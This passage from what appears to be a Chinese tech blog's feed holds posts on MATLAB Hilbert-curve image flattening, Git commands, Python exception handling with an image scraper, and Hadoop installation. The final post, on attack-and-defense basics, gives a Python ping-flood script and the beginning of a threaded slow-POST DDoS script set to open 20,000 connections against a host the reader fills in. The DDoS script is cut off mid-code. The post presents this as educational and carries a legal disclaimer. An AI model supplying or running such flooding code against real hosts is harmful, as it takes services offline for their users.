class="hljs-built_in">j</span>).name;<span class="hljs-comment">% 图像名 ?</span>                 image = imread(strcat(file_path,image_name));                  I{<span class="hljs-built_in">j</span>}=image;                 fprintf(<span class="hljs-string">'%d %d %s\n'</span>,<span class="hljs-number">1</span><span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>,strcat(file_path,image_name));<span class="hljs-comment">% 显示正在处理的图像名</span>                 <span class="hljs-comment">%图像处理过程</span>                 <span class="hljs-comment">% image_gray = rgb2gray(image);        %将RGB图像转换成灰度图</span>                 image=imresize(image,[<span class="hljs-number">600</span>,<span class="hljs-number">600</span>],<span class="hljs-string">'nearest'</span>);   <span class="hljs-comment">%调整图像大小为160×160</span>                 [r,c,p]=<span class="hljs-built_in">size</span>(image);            <span class="hljs-comment">%获取图片分辨率大小，大小为m*n</span>                 B = <span class="hljs-built_in">reshape</span>(image,<span class="hljs-number">1</span>,r*c*p);        <span class="hljs-comment">%根据图像分辨率拉伸成为长度m*n的向量</span>                 data(<span class="hljs-built_in">j</span>,<span class="hljs-number">1</span>:r*c*p) = B;            <span class="hljs-keyword">end</span> <span class="hljs-keyword">end</span><span class="hljs-comment">% xlswrite( "D:\ONE.xlsx",data)  %将一维化之后的图像数据保存为xlsx文件</span></code></pre></div><h3 id="希尔伯特曲线法"><a href="#希尔伯特曲线法" class="headerlink" title="希尔伯特曲线法"></a>希尔伯特曲线法</h3><p>相比直接拉伸，用希尔伯特曲线的方法将图像一维化可以保留图像结构特征</p><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">%leftright.m</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[y]</span> = <span class="hljs-title">leftright</span><span class="hljs-params">(x)</span></span>    sizecol = <span class="hljs-built_in">size</span>(x, <span class="hljs-number">2</span>);    y = <span class="hljs-built_in">zeros</span>(sizecol);    <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span> : sizecol        y(:, <span class="hljs-built_in">i</span>) = x(:, sizecol + <span class="hljs-number">1</span> - <span class="hljs-built_in">i</span>);    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% show_curve.m</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_curve</span><span class="hljs-params">(H)</span></span>size_col = <span class="hljs-built_in">size</span>(H, <span class="hljs-number">2</span>);map = <span class="hljs-built_in">zeros</span>(size_col * size_col, <span class="hljs-number">3</span>);count = <span class="hljs-number">1</span>;<span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span> : size_col    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span> : size_col        map(count, <span class="hljs-number">1</span>) = <span class="hljs-built_in">i</span>;        map(count, <span class="hljs-number">2</span>) = <span class="hljs-built_in">j</span>;        map(count, <span class="hljs-number">3</span>) = H(<span class="hljs-built_in">i</span>, <span class="hljs-built_in">j</span>);        count = count + <span class="hljs-number">1</span>;    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span>map = <span class="hljs-built_in">sortrows</span>(map, <span class="hljs-number">3</span>);<span class="hljs-built_in">plot</span>(map(:,<span class="hljs-number">1</span>), map(:, <span class="hljs-number">2</span>));axis([<span class="hljs-number">0</span> size_col + <span class="hljs-number">1</span> <span class="hljs-number">0</span> size_col + <span class="hljs-number">1</span>]);<span class="hljs-keyword">end</span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs matlab">H2 = [<span class="hljs-number">1</span> <span class="hljs-number">2</span>; <span class="hljs-number">4</span> <span class="hljs-number">3</span>];H = H2;<span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span> : <span class="hljs-number">9</span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">mod</span>(<span class="hljs-built_in">i</span>, <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>        H = [H, <span class="hljs-number">4</span>^<span class="hljs-built_in">i</span> + H';             (<span class="hljs-number">4</span>^(<span class="hljs-built_in">i</span> + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>) - updown(H), (<span class="hljs-number">3</span> * <span class="hljs-number">4</span>^<span class="hljs-built_in">i</span> + <span class="hljs-number">1</span>) - (leftright(H)')];    <span class="hljs-keyword">else</span>        H = [H, (<span class="hljs-number">4</span>^(<span class="hljs-built_in">i</span> + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>) - leftright(H);             (<span class="hljs-number">4</span>^<span class="hljs-built_in">i</span>) + H', (<span class="hljs-number">3</span> * <span class="hljs-number">4</span>^<span class="hljs-built_in">i</span> + <span class="hljs-number">1</span>) - leftright(H')];    <span class="hljs-keyword">end</span>    H<span class="hljs-keyword">end</span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% updwon.m</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[y]</span> = <span class="hljs-title">updown</span><span class="hljs-params">(x)</span></span>    sizerow = <span class="hljs-built_in">size</span>(x, <span class="hljs-number">1</span>);    y = <span class="hljs-built_in">zeros</span>(sizerow);    <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span> : sizerow        y(<span class="hljs-built_in">i</span>, :) = x(sizerow + <span class="hljs-number">1</span> - <span class="hljs-built_in">i</span>, :);    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre></div><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p><a href="https://github.com/clayliu" target="_blank" rel="noopener">@ClayLiu</a></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.cjig.cn/jig/ch/reader/view_abstract.aspx?file_no=20060119" target="_blank" rel="noopener">Hilbert曲线扫描矩阵的生成算法及其MATLAB程序代码</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git bash常用操作汇总</title>
      <link href="/2020/05/04/Git%20bash%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%B1%87%E6%80%BB/"/>
      <url>/2020/05/04/Git%20bash%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>Git常用命令汇总（懒得老是去看文档了）</p><a id="more"></a><h3 id="新建"><a href="#新建" class="headerlink" title="新建"></a>新建</h3><p>在你存放项目代码的文件夹，输入代码新建Git本地仓库</p><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">git init</span></code></pre></div><p>新建之后会出现一个git文件夹，并且存放项目代码的文件夹会出现一个<strong>绿色的勾</strong>,表示已经同步到本地分支；命令行用户最后面有个<strong>master</strong>，表示在本地的master分支。</p><p> 此时可以通过命令git branch查看本地分支</p><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">git <span class="hljs-keyword">branch </span> <span class="hljs-comment">#查看本地分支</span>git <span class="hljs-keyword">branch </span>-r  <span class="hljs-comment">#查看远程分支</span>git <span class="hljs-keyword">branch </span>-a  <span class="hljs-comment">#查看所有分支</span></code></pre></div><p>在这里先不介绍远程，先学会本地版本控制</p><p>如果需要创建其他分支，可以用切换分支的命令加上参数创建分支</p><div class="hljs code-wrapper"><pre><code class="hljs q">git checkout <span class="hljs-built_in">dev</span> #切换到本地的<span class="hljs-built_in">dev</span>分支git checkout -b <span class="hljs-built_in">dev</span> #创建并切换到本地的<span class="hljs-built_in">dev</span>分支</code></pre></div><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>修改文件后，<strong>绿色的勾</strong>会变成<strong>红色的感叹号</strong>，表示更新到git的分支(如果切换到了master分支，就表示该文件没有更新到master分支，如果切换到dev分支就表示该文件没有更新到dev分支)</p><div class="hljs code-wrapper"><pre><code class="hljs avrasm">git <span class="hljs-keyword">add</span> -A  <span class="hljs-meta">#将所有文件添加到暂存区</span>git commit -m <span class="hljs-string">"first commit"</span> <span class="hljs-meta">#这一步是备注，注意这个步骤一定要有，否则会提交失败</span>git <span class="hljs-keyword">push</span> -u origin master <span class="hljs-meta">#表示提交到远程master分支，在此只是因为没有关联远程分支暂且不管</span></code></pre></div><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><p>如果某个分支要更新到跟另一个分支的文件一样，使用merge</p><p>假设现在是在本地dev分支</p><div class="hljs code-wrapper"><pre><code class="hljs crmsh">git checkout <span class="hljs-keyword">master</span> <span class="hljs-title">#切换到本地master</span>git merge dev <span class="hljs-comment">#把本地dev分支合并到当前本地分支(master)中</span></code></pre></div><h3 id="回滚"><a href="#回滚" class="headerlink" title="回滚"></a>回滚</h3><div class="hljs code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-string">git </span><span class="hljs-string">reflog</span><span class="hljs-comment">#会显示id</span><span class="hljs-string">git </span> <span class="hljs-string">reset </span><span class="hljs-built_in">--hard</span>  <span class="hljs-string">commit_id</span><span class="hljs-comment">#commit_id填写git reflog显示的id</span></code></pre></div><h3 id="关联远程"><a href="#关联远程" class="headerlink" title="关联远程"></a>关联远程</h3><div class="hljs code-wrapper"><pre><code class="hljs crmsh">git checkout <span class="hljs-literal">master</span>git remote add origin https://github.com/coneycode/hexo-git-backup.git <span class="hljs-comment">#添加远程仓库</span>git fetch origin <span class="hljs-keyword">master</span> <span class="hljs-title">#取回(名称为)origin</span>服务器的<span class="hljs-literal">master</span>分支，即拉取远程<span class="hljs-literal">master</span>分支</code></pre></div><h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><h4 id=""><a href="#" class="headerlink" title=""></a></h4><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">git init   <span class="hljs-comment"># 本地创建仓库 </span>git <span class="hljs-keyword">add</span><span class="bash"> -A  <span class="hljs-comment"># 提交所有文件</span></span>git commit -m <span class="hljs-string">"first commit"</span>  <span class="hljs-comment"># 提交文件至本地缓存区</span>git remote <span class="hljs-keyword">add</span><span class="bash"> origin https://github.com/githubusername/githubrepositories.git <span class="hljs-comment">#添加远程仓库</span></span>git push -u origin master <span class="hljs-comment">#提交代码至远程仓库master分支</span></code></pre></div><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200714064123166.png" srcset="/img/loading.gif" lazyload="" alt="image-20200714064123166"></p><p>解决办法：</p><p>先</p><div class="hljs code-wrapper"><pre><code class="hljs ada">git pull <span class="hljs-comment">--rebase origin master</span></code></pre></div><p>再</p><div class="hljs code-wrapper"><pre><code class="hljs maxima">git <span class="hljs-built_in">push</span> <span class="hljs-built_in">origin</span> master</code></pre></div><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">git官方中文文档</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python异常处理</title>
      <link href="/2020/04/26/python%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
      <url>/2020/04/26/python%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>python异常处理解决爬虫遇到404的问题</p><a id="more"></a><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:    <span class="hljs-comment">#运行可能产生异常的代码</span>    <span class="hljs-keyword">except</span>：    <span class="hljs-comment">#如果try后面的代码运行错误则运行这部分代码</span></code></pre></div><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<span class="hljs-comment">#运行可能产生异常的代码</span><span class="hljs-keyword">except</span>：<span class="hljs-comment">#如果try后面的代码运行错误则运行这部分代码              </span><span class="hljs-keyword">else</span>：<span class="hljs-comment">#如果没有异常发生</span></code></pre></div><h3 id="没有异常处理的程序"><a href="#没有异常处理的程序" class="headerlink" title="没有异常处理的程序"></a>没有异常处理的程序</h3><p>以爬取王者荣耀图片为例子</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<span class="hljs-keyword">import</span> os<span class="hljs-comment"># http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/191/191-bigskin-1.jpg 王者荣耀图床地址   文件夹191～529 -1表示皮肤 ，之后是-2 、-3...</span><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> range(<span class="hljs-number">105</span>,<span class="hljs-number">600</span>):    <span class="hljs-comment"># try:</span>        path = <span class="hljs-string">r'D:\文档\code\web前端\王者荣耀图库\皮肤\ '</span>        <span class="hljs-comment"># os.mkdir(path + str(num))         #创建文件夹</span>        response = urllib.request.urlopen(<span class="hljs-string">"http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/"</span>+str(num)+<span class="hljs-string">"/"</span>+str(num)+<span class="hljs-string">"-bigskin-1"</span>+<span class="hljs-string">".jpg"</span>)  <span class="hljs-comment">#图片地址</span>        print(response)        wangzhe_img = response.read()        <span class="hljs-keyword">with</span> open(<span class="hljs-string">'D:\文档\code\web前端\王者荣耀图库\皮肤\ '</span>+ str(num) + <span class="hljs-string">'.jpg'</span>,<span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:            f.write(wangzhe_img)    <span class="hljs-comment"># except:</span>    <span class="hljs-comment">#     continue</span></code></pre></div><h3 id="有异常处理的程序"><a href="#有异常处理的程序" class="headerlink" title="有异常处理的程序"></a>有异常处理的程序</h3><p>按照上述方式爬取图片，会遇到当网址无法打开则无法进行下一步的问题（王者荣耀图片网站并不是191~529都有图片，有些英雄之间的编号可能有间隔，因而运行程序遇到这种情况会出现error）</p><p>为解决该问题，使用try异常处理，当遇到无法打开的网址时，直接跳过继续循环的下一个步骤，如：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<span class="hljs-keyword">import</span> os<span class="hljs-comment"># http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/191/191-bigskin-1.jpg 王者荣耀图床地址   文件夹191～529 -1表示皮肤 ，之后是-2 、-3...</span><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> range(<span class="hljs-number">105</span>,<span class="hljs-number">600</span>):    <span class="hljs-keyword">try</span>:        path = <span class="hljs-string">r'D:\文档\code\web前端\王者荣耀图库\皮肤\ '</span>        <span class="hljs-comment"># os.mkdir(path + str(num))         #创建文件夹</span>        response = urllib.request.urlopen(<span class="hljs-string">"http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/"</span>+str(num)+<span class="hljs-string">"/"</span>+str(num)+<span class="hljs-string">"-bigskin-1"</span>+<span class="hljs-string">".jpg"</span>)  <span class="hljs-comment">#图片地址</span>        print(response)        wangzhe_img = response.read()        <span class="hljs-keyword">with</span> open(<span class="hljs-string">'D:\文档\code\web前端\王者荣耀图库\皮肤\ '</span>+ str(num) + <span class="hljs-string">'.jpg'</span>,<span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:            f.write(wangzhe_img)    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">continue</span></code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop大数据生态安装</title>
      <link href="/2020/04/26/hadoop%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%94%9F%E6%80%81%E5%AE%89%E8%A3%85/"/>
      <url>/2020/04/26/hadoop%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%94%9F%E6%80%81%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>环境配置</p><a id="more"></a><h2 id="Hadoop安装（2021版）"><a href="#Hadoop安装（2021版）" class="headerlink" title="Hadoop安装（2021版）"></a>Hadoop安装（2021版）</h2><p>Ubuntu18.04 照着这篇教程来啥问题也没有：<br><a href="https://m.linuxidc.com/Linux/2019-12/161628.htm" target="_blank" rel="noopener">Ubuntu 18.04下搭建单机Hadoop和Spark集群环境</a>  </p><h3 id="关于系统"><a href="#关于系统" class="headerlink" title="关于系统"></a>关于系统</h3><p>考虑到可能大多数同学用的都是Windows系统，所以这里附上搭建linux系统的办法： </p><h3 id="win10的linux子系统（WSL）"><a href="#win10的linux子系统（WSL）" class="headerlink" title="win10的linux子系统（WSL）"></a>win10的linux子系统（WSL）</h3><p>WSL是默认安装在C盘的，如果不想占用C盘空间，就需要在<strong>安装子系统之前</strong>建立软连接：（若不在乎C盘空间请忽略）：<br><a href="https://blog.csdn.net/m0_37990055/article/details/89709963?from=groupmessage" target="_blank" rel="noopener">Windows下Linux子系统迁移到非系统盘 原创</a></p><p><a href="https://blog.csdn.net/qq_43457125/article/details/94897476?from=singlemessage" target="_blank" rel="noopener">win10系统如何开启子系统 （详细）</a></p><p><a href="https://zhuanlan.zhihu.com/p/35735513?from=singlemessage" target="_blank" rel="noopener">从安装到基本设置——Win10子系统入门简明教程</a></p><p>以上任选其一</p><p>之后是图形界面，对新手来说没有图形界面是挺累skr人的，用过之后尽量早点丢开图形界面使用命令行：<br><a href="https://baijiahao.baidu.com/s?id=1596652006568524478&amp;wfr=spider&amp;for=pc&amp;from=singlemessage" target="_blank" rel="noopener">Win10子系统安装图形化界面的两种方法</a><br>可以把这里的Debian当成Ubuntu，命令行是一样的</p><h3 id="双系统"><a href="#双系统" class="headerlink" title="双系统"></a>双系统</h3><p>因为显卡驱动的原因，目前主流的显卡对Linux的支持都不好，所以安装会黑屏。  一般来说第一次开机禁用显卡就好了。    以下仅说明黑屏解决办法：  </p><p><a href="https://blog.csdn.net/cheneykl/article/details/79111618" target="_blank" rel="noopener">安装ubuntu时黑屏三种解决办法</a></p><p><a href="https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=174315&amp;from=singlemessage" target="_blank" rel="noopener">AMD锐龙 2200g安装和使用deepin</a></p><h2 id="Win10环境Hadoop安装（2021版）"><a href="#Win10环境Hadoop安装（2021版）" class="headerlink" title="Win10环境Hadoop安装（2021版）"></a>Win10环境Hadoop安装（2021版）</h2><ul><li>安装</li></ul><p>建议安装版本：Hadoop3.0.0+Spark3.0.0+Hive3.1</p><p><a href="https://blog.csdn.net/qq_42754919/article/details/109402379" target="_blank" rel="noopener">windows安装Spark3.0.0+hadoop+JDK大数据开发平台_我本将心向明月丶的博客-CSDN博客</a></p><p>已编译包下载：</p><p><a href="https://github.com/steveloughran/winutils" target="_blank" rel="noopener">GitHub - steveloughran/winutils: Windows binaries for Hadoop versions (built from the git commit ID used for the ASF relase)</a></p><ul><li>启动命令（注：需要打开cmd输入命令，直接打开文件无法启动）：</li></ul><div class="hljs code-wrapper"><pre><code class="hljs shell">start-all.cmd</code></pre></div><ul><li><p>检测</p><p><strong>出现四个任务管理且不报错，并不一定说明安装成功。测试是否开启成功：输入命令<code>jps</code></strong><br>出现下面四个才能说明安装成功，如果不出现四个说明安装没有成功，可能是上面第四步出现问题，重新配置。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20201031151402658.png#pic_center" srcset="/img/loading.gif" lazyload="" alt=""></p><ul><li><p>打开（Web端）</p><div class="hljs code-wrapper"><pre><code class="hljs shell">http://localhost:9870/</code></pre></div><p>在浏览器地址栏中输入：<a href="http://localhost:8088/" target="_blank" rel="noopener">http://localhost:8088</a>查看集群状态</p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全攻防基础</title>
      <link href="/2020/04/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/04/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>妙啊</p><a id="more"></a><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>先明确本篇文章旨在让有意学习者了解计算机病毒入侵的手段和防护办法，请各位学习者自觉遵循中华人民共和国相关法律法规。  其次，如果认为“黑客是坏蛋”，建议先看看<a href="https://m.baidu.com/sf_bk/item/%E9%BB%91%E5%AE%A2/118396?ms=1&amp;rid=11053482354809685763" target="_blank" rel="noopener">黑客骇客谁是坏蛋？</a>  </p><p>其实关于入侵技术的文章一直都是比较少，可能是因为现在国家企业对网络安全越来越重视了，越来越多的技术人员从事网络安全防护，病毒入侵也不似以前那么猖狂。  </p><h1 id="计算机病毒介绍"><a href="#计算机病毒介绍" class="headerlink" title="计算机病毒介绍"></a>计算机病毒介绍</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>  狭义上的计算机病毒是指能够进行自我传播，需要用户敢于来触发执行的破坏性程序或代码。</p><h2 id="计算机病毒分类"><a href="#计算机病毒分类" class="headerlink" title="计算机病毒分类"></a>计算机病毒分类</h2><ul><li><p>按照计算机病毒攻击的系统分类：<br>（1）攻击Windows系统的病毒<br>（2）攻击DOS系统的病毒<br>（3）攻击UNIX系统的病毒<br>（4）攻击Operating System/2系统的病毒  </p></li><li><p>按照计算机病毒的链结方式分类<br>（1）源码型病毒<br>（2）嵌入型病毒<br>（3）外壳型病毒<br>（4）操作系统型病毒   </p></li><li><p>按照计算机病毒的破坏情况分类<br>（1）良性计算机病毒<br>（2）恶性计算机病毒<br>（3）引导型计算机病毒  </p></li><li><p>按照计算机病毒的传播媒介分类<br>（1）单机病毒<br>（2）网络病毒  </p></li></ul><h2 id="黑客术语"><a href="#黑客术语" class="headerlink" title="黑客术语"></a>黑客术语</h2><p>蠕虫：一段能进行自我传播，无须用户干预而可以自动触发执行额破坏性程序或代码。</p><p>木马：是指附着在应用程序上或单独存在的一些恶意程序，他可以利用网络远程响应网络的另一端的控制程序的控制命令，实现对被植入木马的目标计算机的控制或者窃取感染木马程序 的计算机上的机密资料。</p><p>后门：允许攻击者绕过系统中常规安全控制机制的程序，它按照攻击者自己的意图提供通道。</p><p>僵尸（bot）：是指实现恶意控制功能的程序代码。大量被植入僵尸程序的电脑通过僵尸控制服务器便可以形成僵尸网络。</p><p>rootkit：室友很多有用的小程序组成的工具包，使得攻击者能够保持访问计算机上具有最高权限的用户“root”。 换言之 ，rootkit是可以持久的，无法被检测地存在于计算机的一组程序或代码。</p><p>间谍软件：以主动收集用户个人信息，相关机密文件或隐私数据为主，收集到的数据会主动传送到指定服务器 。</p><p>流氓软件：具有一定的实用价值但具备电脑病毒和黑客软件的部分特征的软件</p><p>exploit：精心设计的用于利用特定漏洞以及对目标系统进行控制的程序</p><p>提权：操作系统低权限的账户将自己提升为管理员权限使用的方法。  </p><p>后门：黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。  </p><p>跳板：使用肉鸡IP来实施攻击的其他目标，以便更好的隐蔽自己的身份信息。  </p><p>旁站入侵：即同服务器下的网站入侵，入侵之后可以通过提权跨目录手段拿到目标网站的权限。(常见的工具有：WebRobot、御剑、明小子和web在线查询等) 。 </p><p><a href="https://blog.csdn.net/qq_40769535/article/details/89574422" target="_blank" rel="noopener">更多黑客术语查看</a>  </p><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><ul><li>首先，安装Python<br>相信这一步大家都轻车熟路的啦，在这里略过……<br>（PS：以下演示环境为Python3.7）<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjE1MjMyMw==&amp;mid=2650202449&amp;idx=4&amp;sn=461cd7441267ada4d4c5662d74ca4494&amp;chksm=8ee141bdb996c8ab0b586bfb64e97855d14f597ac9d27035fee52d32a24f7560bbce3cbef0a2&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">安装Python3.7</a>  </li></ul><ul><li>安装虚拟机并安装Windows系统镜像<br>攻击别人的电脑或网站犯法，所以自己搭建个虚拟机吧（说机不说吧，文明你我他）òᆺó<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjE1MjMyMw==&amp;mid=2650203072&amp;idx=1&amp;sn=b21a1c1d4526cb578efa7aeb74f4d857&amp;chksm=8ee1432cb996ca3ae786c341458b2d52d9af516134975a43180d904e36c14253596f28be7996&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">安装VMware</a><br><a href="https://blog.csdn.net/qq3399013670/article/details/81937412" target="_blank" rel="noopener">安装VitrualBox</a><br>以上安装虚拟机方式任选其一，安装完成记得下载iso文件安装系统  </li></ul><h2 id="ping网络堵塞"><a href="#ping网络堵塞" class="headerlink" title="ping网络堵塞"></a>ping网络堵塞</h2><p>首先，需要获取攻击的ip地址（这个是最基本的，连没有ip地址都不知道，就啥也搞不了）。<br>Windows系统获得本机的ip地址只需要打开命令提示符（cmd）并输入ipconfig就可以了。但是攻击的时候需要目标的ip地址，这个时候就需要抓包工具啦。<br><a href="https://blog.csdn.net/gufenchen/article/details/90895856" target="_blank" rel="noopener">常用的几款抓包工具</a> ，找一个你觉得顺眼的工具用一下吧！（这里说一下，黑客的软件，不能随便下载，指不准在软件里做了手脚打包发出来的，所以尽量还是去可靠的渠道下载黑客工具吧，例如官网~）<br>如果是获取网站ip地址，直接打开cmd，ping一下域名就行了。<br><code>ping baidu.com</code>   </p><center>如图，得到的   就是ip地址</center>在这里来个补充，ping一下ip，原理上是本机给对方ip地址发送请求，如果对方ip收到请求那么就给本机返回数据包~在这过程中对方ip地址对应的服务器（电脑）<p>试想，如果一直发送会不会造成网络堵塞？<br>因此有了以下操作：  </p><p>PING -t ip<br>注：这样可以PING指定的IP到永远，除非你停止它。很多初级黑客喜欢用这个参数来进行网络堵塞的攻击。<br>PING -l 大小 ip<br>注：这样可以设置发送包大小<br>PING -n 次数 ip<br>注：这样可以设置次数。 </p><p><code>PING -n 10 -l 10 baidu.com</code> </p><p>图</p><p>利用ping造成网络堵塞的Python3.7代码</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> timeip = input(<span class="hljs-string">"请输入IP："</span>)os.system(<span class="hljs-string">"ping -t -l 50 "</span> + ip)</code></pre></div><h2 id="分布式拒绝服务攻击（DDos）"><a href="#分布式拒绝服务攻击（DDos）" class="headerlink" title="分布式拒绝服务攻击（DDos）"></a>分布式拒绝服务攻击（DDos）</h2><p>分布式拒绝服务攻击可以使很多的计算机在同一时间遭受到攻击，是一种网络攻击手法，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>来看看Python3.7的DDos代码</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> threading<span class="hljs-comment">#Pressure Test,ddos tool</span><span class="hljs-comment">#---------------------------</span>MAX_CONN=<span class="hljs-number">20000</span>PORT=<span class="hljs-number">80</span>HOST=<span class="hljs-string">""</span><span class="hljs-comment">#在双引号里输入对方IP或域名，要保证他联网了或开机了.</span>PAGE=<span class="hljs-string">"/index.php"</span><span class="hljs-comment">#---------------------------</span>buf=(<span class="hljs-string">"POST %s HTTP/1.1\r\n"</span><span class="hljs-string">"Host: %s\r\n"</span><span class="hljs-string">"Content-Length: 10000000\r\n"</span><span class="hljs-string">"Cookie: dklkt_dos_test\r\n"</span><span class="hljs-string">"\r\n"</span> % (PAGE,HOST))socks=[]<span class="hljs-function"><span class="hljs-keyword">def</span> <span 